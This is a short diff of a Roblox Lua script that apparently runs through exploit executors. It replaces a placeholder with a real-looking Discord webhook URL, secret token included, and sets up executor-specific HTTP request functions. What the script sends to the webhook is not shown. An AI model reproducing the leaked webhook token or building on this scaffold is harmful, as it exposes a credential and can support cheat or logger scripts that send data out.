@@ -1,5 +1,5 @@
 -- 설정: 본인의 디스코드 웹훅 URL을 입력하세요
-local webhook_url = "YOUR_DISCORD_WEBHOOK_URL_HERE"
+local webhook_url = "https://discord.com/api/webhooks/1453570096869019809/9cAILdpIrYZBMhVz_PgLeI6BK2dwtinEQkiJxPDiF--H-yEmnMOfSLbo3ymEGoDGcDhe"
 
 local lp = game:GetService("Players").LocalPlayer
 local http = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
